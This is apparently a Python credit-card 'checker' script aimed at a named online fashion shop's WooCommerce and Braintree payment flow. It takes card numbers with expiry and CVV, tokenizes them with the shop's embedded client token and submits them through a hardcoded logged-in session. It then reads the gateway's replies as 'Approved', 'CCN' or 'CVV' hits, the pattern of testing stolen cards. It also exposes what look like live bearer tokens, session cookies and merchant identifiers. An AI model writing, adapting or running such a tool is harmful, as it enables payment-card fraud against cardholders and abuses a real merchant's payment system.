import requests
import re
#https://bellamodastudio.com/my-account/add-payment-method/
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()	
	
	import requests

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDM5MDYyMjgsImp0aSI6IjAxNzM4N2RlLWFlYzItNDgxYy1iZTFmLWIwODk2NjAzNDJiMCIsInN1YiI6ImhqMjNmdjVuNHBoc3pqamoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImhqMjNmdjVuNHBoc3pqamoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJpbmZvYmVsbGFtb2Rhc3R1ZGlvY29tIn19.3Pzpg7xtCjqLEnZCKwtS3B7rPRCV1XHGpqdrhTGz8BMZ7g4R__-3Nn33vf4RwpoENtY7hNqFGahFTLPw29NHEg',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'd249fb34-7064-4623-9e8b-85416697b46c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'New York New street',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok = (response.json()['data']['tokenizeCreditCard']['token'])

	import requests

	cookies = {
    '_fbp': 'fb.1.1743204325388.9969175471',
    '_ju_dn': '1',
    '_ju_dc': '246dc807-0c2c-11f0-8e96-8f1f921179fd',
    'wordpress_logged_in_0e7b300954825c233dfd86fbf093aa39': 'feroooz%7C1744414124%7ClIqYq2NGCxQFX4PEmgKUg5ZHar8d64hNzwhRYDuqdL0%7Cb40ddf0f5f1081d411ab318550eecfe09f6a511c6de472a4bc4be70077ddf81a',
    'PHPSESSID': '31ede7ba51e527ed726e13e91db8c480',
    '_gid': 'GA1.2.478321116.1743819617',
    '_ju_v': '4.1_6.14',
    '_ju_dm': 'cookie',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-04-05%2002%3A20%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fbellamodastudio.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-04-05%2002%3A20%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fbellamodastudio.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
    'yotpo_pixel': 'c038abc8-441e-41d2-8b70-98a42baa3615',
    '_sp_ses.d52e': '*',
    'pys_session_limit': 'true',
    'pys_start_session': 'true',
    'pys_first_visit': 'true',
    'pysTrafficSource': 'direct',
    'pys_landing_page': 'https://bellamodastudio.com/',
    'last_pysTrafficSource': 'direct',
    'last_pys_landing_page': 'https://bellamodastudio.com/',
    '_ga_FNQYC8E6RL': 'GS1.1.1743819617.2.1.1743819829.0.0.0',
    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbellamodastudio.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga': 'GA1.2.152643168.1743204325',
    '__kla_id': 'eyJjaWQiOiJNbVl4TVRWa01HWXRPVE14TmkwME5HWTJMVGhoTVRVdE5qSTJNVFUxWVRsbU9HVm0iLCIkZXhjaGFuZ2VfaWQiOiItNVAwRTNFRkV6dE5qU055Sl9ZOWxJMVJpV2dMWk5aTEh2UDA5Y2ZZZUtzLk1tY3hnRCJ9',
    '_ju_pn': '12',
    'TawkConnectionTime': '0',
    'twk_uuid_5a64fb3b4b401e45400c4474': '%7B%22uuid%22%3A%221.2U6TUtetGmYhJyFc9zI04DVa5exrRIKtoJ929RaOYRfcbvENUKVC52gKoowccpCVKyG4tIoGkHNqRreDWtGDiSgDdQdNj497KXBIRKCkAkL3sFiMEHz2lY9A74FgMuh%22%2C%22version%22%3A3%2C%22domain%22%3A%22bellamodastudio.com%22%2C%22ts%22%3A1743819835921%7D',
    '_sp_id.d52e': '884bcde210a49796.1743204325.4.1743819849.1743209990',
}

	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'tr-TR,tr;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://bellamodastudio.com',
    'Referer': 'https://bellamodastudio.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"e281895e9554cd22a4e1941ba0f749aa","fraud_merchant_id":null,"correlation_id":"d249fb34-7064-4623-9e8b-85416697"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/hj23fv5n4phszjjj/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/hj23fv5n4phszjjj"},"merchantId":"hj23fv5n4phszjjj","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bella Moda Studio Inc.","clientId":"AVklEQ78Ty3IJVoOyejQlxzmKNuqUPuhM14F9V84RnPUfXtlzS8ry8HYBF3-OsPR7gXreDX0TMqyp3BM","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"infobellamodastudiocom","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': 'e249c25c07',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://bellamodastudio.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

	import re	
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		kopi = match.group(1)
		if 'risk_threshold' in kopi:
			return "RISK: Retry this BIN later."
		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
			return "Please wait for 20 seconds."
		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
			return '1000: Approved'
		elif 'Duplicate card exists in the vault.' in kopi:
			return 'Approved'
		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
			return '1000: Approved'
		elif "Invalid postal code" in kopi or "CVV." in kopi:
			return 'Approved (CVV)'
		elif "Card Issuer Declined CVV" in kopi:
			return 'Approved (CCN)'
		else:
			return kopi
	else:
		if 'Payment method successfully added.' in text:
			return "1000: Approved"
		elif 'risk_threshold' in text:
			return "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			return "try again"
		else:
			return 'Unknow Response'